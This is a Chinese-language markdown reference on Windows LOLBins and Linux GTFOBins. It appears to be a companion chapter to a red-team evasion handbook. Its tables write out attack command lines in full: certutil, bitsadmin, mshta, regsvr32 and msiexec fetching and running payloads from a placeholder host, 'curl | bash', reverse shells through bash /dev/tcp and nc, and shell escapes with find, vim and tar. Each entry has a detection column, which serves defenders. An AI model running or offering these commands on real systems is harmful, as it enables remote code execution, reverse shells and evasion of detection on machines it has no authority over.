# LOLBins & GTFOBins — 活体二进制参考

> 本文件为 `evasion-comprehensive.md` §4 的伴生手册（补齐「Full LOLBins & GTFOBins reference」断链）。
> 覆盖 Windows LOLBins 与 Linux GTFOBins 的**用途 → 命令 → 检测侧 → 实测判据**。
> 授权立场见 `refs/README.md`；权威在线库：LOLBAS (lolbas-project.github.io)、GTFOBins (gtfobins.github.io)。

## 0. 使用原则

- LOLBin = 系统自带签名二进制被滥用，借「合法签名」降低静态/行为怀疑。
- 检测侧核心：**合法二进制 + 异常参数/网络外连/异常父进程**的组合，而非二进制本身。

---

## 1. Windows LOLBins（Top 10 + 扩展）

| LOLBin | 用途 | 命令模式 | 检测侧对应点 |
|---|---|---|---|
| `certutil` | 下载/解码 | `certutil -urlcache -split -f http://x/p.exe` | Sysmon 1 命令行 + 网络外连 |
| `mshta` | HTA/JS 执行 | `mshta http://x/evil.hta` | mshta 外连 + 子进程 |
| `regsvr32` | COM scriptlet | `regsvr32 /s /n /u /i:http://x/sc.sct scrobj.dll` | regsvr32 网络参数 |
| `rundll32` | DLL 导出执行 | `rundll32 payload.dll,Entry` | 异常 DLL 加载 |
| `wmic` | XSL 执行 | `wmic os get /format:"http://x/evil.xsl"` | wmic 网络 format |
| `msbuild` | 内联 C# 执行 | `msbuild evil.csproj` | msbuild 加载异常项目 |
| `installutil` | .NET 程序集 | `installutil /logfile= /LogToConsole=false /U p.exe` | installutil 异常参数 |
| `mavinject` | DLL 注入 | `mavinject $PID /INJECTRUNNING p.dll` | mavinject 注入行为 |
| `cmstp` | INF 脚本执行 | `cmstp /s /ns evil.inf` | cmstp 加载异常 INF |
| `wscript/cscript` | WSH 执行 | `wscript //E:vbscript evil.txt` | 脚本引擎异常 |
| `bitsadmin` | 下载 | `bitsadmin /transfer n http://x/p.exe C:\p.exe` | BITS 下载任务 |
| `msiexec` | MSI 下载执行 | `msiexec /q /i http://x/p.msi` | msiexec 网络安装 |
| `regsvr32`（scrobj） | 远程 SCT | `regsvr32 /u /s /i:http://x/s.sct scrobj.dll` | 远程 scriptlet |
| `msdt` | 诊断工具（历史 CVE） | `msdt.exe /id PCWDiagnostic ...` | 诊断工具异常参数 |

---

## 2. Linux GTFOBins（代表条目）

| 二进制 | 用途 | 命令模式 | 检测侧 |
|---|---|---|---|
| `curl`/`wget` | 下载 | `curl http://x/p.sh | bash` | 管道到 shell |
| `bash` | 反向 shell | `bash -i >& /dev/tcp/x/443 0>&1` | /dev/tcp 特征 |
| `nc` | 反向 shell | `nc -e /bin/sh x 443` | nc 外连 |
| `python` | 反向 shell/提权 | `python -c 'import pty;pty.spawn(...)'` | python 网络 |
| `perl`/`ruby`/`php` | 反向 shell | 各语言 `-e` 网络代码 | 脚本引擎网络 |
| `awk` | 命令执行 | `awk 'BEGIN{system("id")}'` | system() 调用 |
| `find` | 提权执行 | `find . -exec /bin/sh -p \;` | find -exec shell |
| `vim`/`less`/`man` | 提权 shell 逃逸 | `:!sh` / `!/bin/sh` | 编辑器逃逸 |
| `tar`/`zip` | 通配符注入 | `tar -cf /tmp/x.tar --checkpoint=1 --checkpoint-action=exec=sh` | 通配符 + exec |
| `env`/`timeout` | 执行 | `env /bin/sh` / `timeout 1 /bin/sh` | 间接执行 |

---

## 3. 检测侧总表（回馈 attack-defense）

| 平台 | 检测点 | 判据 |
|---|---|---|
| Windows | LOLBin 命令行参数 + 网络外连 + 异常父进程 | Sysmon 1/3 + 进程树 |
| Linux | 脚本引擎网络 + 管道到 shell + /dev/tcp | auditd + 网络遥测 |

## 4. 实测判据

| 判据 | 方法 |
|---|---|
| LOLBin 是否被用于执行 | 命令行含下载/执行参数 + 后续子进程/外连 |
| 是否规避 | 用正常参数基线（如 certutil 仅 decode 不下载）对比 |

*WARNING: 授权红队评估与安全研究专用。*
